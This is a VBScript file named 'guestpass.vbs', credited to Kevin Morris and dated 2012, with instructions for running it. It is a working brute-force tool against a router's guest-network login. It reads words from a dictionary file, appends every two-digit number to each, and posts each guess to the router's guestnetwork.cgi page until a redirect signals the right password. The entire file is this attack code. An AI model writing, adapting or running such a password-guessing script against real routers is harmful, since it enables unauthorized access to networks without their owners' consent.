'========== guestpass.vbs ==========
' Author: Kevin Morris
' October 2012
'
' Usage: (connect to guest netwowrk first)
' C:\> cscript guestpass.vbs
'
' (You may need to remove the UTF-8 byte order mark from the 
'    password file, if the first word is garbled)

Option Explicit

Const PostStr = "submit_button=login&change_action=&action=Apply&wait_time=19&submit_type=&gn_host_url=www.google.com&gn_view_type=0&guest_login="
Const passwordFilename1 = "guest.password.first.words.dict"

Sub Main()
	Dim objFSO: Set objFSO = CreateObject("Scripting.FileSystemObject")
    	Dim objHTTP: Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
	objHTTP.Option(6) = False 'Option 6 - Don't Follow HTTP Redirects

	Dim objFile, password1
	Dim i: i=0
	
	If objFSO.FileExists(passwordFilename1) Then 
		Set objFile = objFSO.OpenTextFile(passwordFilename1, 1) 
		Do While Not objFile.AtEndOfStream 
			password1 = Trim(objFile.ReadLine)
			If password1 <> "" Then 
				For i = 0 to 99
					Call objHTTP.Open("POST", "http://192.168.33.1/guestnetwork.cgi", False)
					Call objHTTP.setRequestHeader("Cache-Control", "no-cache, no-store")
					objHTTP.Send PostStr & password1 & Right("0" & CStr(i), 2)
					
					If objHTTP.status <> 302 Then
						WScript.Echo("Tried: " & password1 & Right("0" & CStr(i), 2))
					Else
						WScript.Echo("Password Found: " & password1 & Right("0" & CStr(i), 2))
						Exit Do
					End If
				Next
			End If 
		Loop 
		objFile.Close
		Set objFile = Nothing
	End If
    
	Set objFSO  = Nothing
	Set objHTTP = Nothing
End Sub

Sub EnsureCScript()
        Dim objShell: Set objShell = CreateObject("Wscript.Shell")
        If LCase(Right(Wscript.FullName, 11)) <> "cscript.exe" Then
                objShell.Run WScript.Path & "\cscript.exe //NOLOGO //B " & Chr(34) & WScript.scriptFullName & Chr(34),1,False
                WScript.Quit 0
        End If
End Sub

Call EnsureCScript()
Call Main()

